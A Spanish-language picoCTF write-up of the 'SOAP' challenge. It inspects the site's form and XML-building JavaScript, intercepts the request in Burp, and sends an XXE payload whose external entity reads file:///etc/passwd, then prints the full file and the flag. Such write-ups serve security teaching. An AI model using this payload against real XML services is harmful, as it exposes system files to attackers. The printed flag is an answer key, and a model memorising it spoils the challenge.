# SOAP

## Descripcion
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:55018/)
## Solucion

Iniciamos la instancia del reto.
Accedemos al sitio y nos damos cuenta de que es un sitio simple que tiene una estructura sencilla en la que hay 3 botones
Al ver el código fuente vemos que los botones hacen un POST

```html
<div class="col-md-4">
	<div class="card mb-4 shadow-sm">
		<img src="[/static/image2.png](http://saturn.picoctf.net:61106/static/image2.png)" class="bd-placeholder-img
card-img-top" width="100%" height="225">
	<div class="card-body">
		<p class="card-text"><b>Carnegie Mellon University Africa</b> Offers 3 masters degree programs.</p>
	<div class="d-flex justify-content-between align-items-center">
		<div class="btn-group">
			<form class="detailForm" action="/data" method="POST">
				<input required type="hidden" name="ID" value="1">
			<button type="submit" class="btn btn-smbtn-outline-secondary">Details</button>
			</form>
		</div>
	</div>
	</div>
	</div>
</div>
```

Vemos que tiene un js que de algun modo se relaciona con estos botones para pedir los datos al servidor, y vemos como es que se forma la parte del xml

```js
window.contentType = 'application/xml';

function payload(data) {
    var xml = '<?xml version="1.0" encoding="UTF-8"?>';
    xml += '<data>';

    for(var pair of data.entries()) {
        var key = pair[0];
        var value = pair[1];

        xml += '<' + key + '>' + value + '</' + key + '>';
    }

    xml += '</data>';
    return xml;
}
```

Ahora que tenemos la información y sabemos que es una vulnerabilidad de XXE para regresar archivos nos vamos a Burpsuit e interceptamos la peticion.
En el proxy de Burp vemos como la peticion es formada y enviada

```
POST /data HTTP/1.1
Host: saturn.picoctf.net:61106
Content-Length: 61
Accept-Language: es-419
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:61106
Referer: http://saturn.picoctf.net:61106/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>
```
 
Ahora procedemos a seguir los pasos para hacer el xxe injection

```
POST /data HTTP/1.1
Host: saturn.picoctf.net:61106
Content-Length: 61
Accept-Language: es-419
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:61106
Referer: http://saturn.picoctf.net:61106/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<data>
		<ID>
			&xxe;
		</ID>
	</data>
```

Y esto nos regresa el contenido de todo el archivo /etc/passwd y nuestra flag

```
Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}
```

```flag
picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}
```
## Notas adicionales

## Referencias
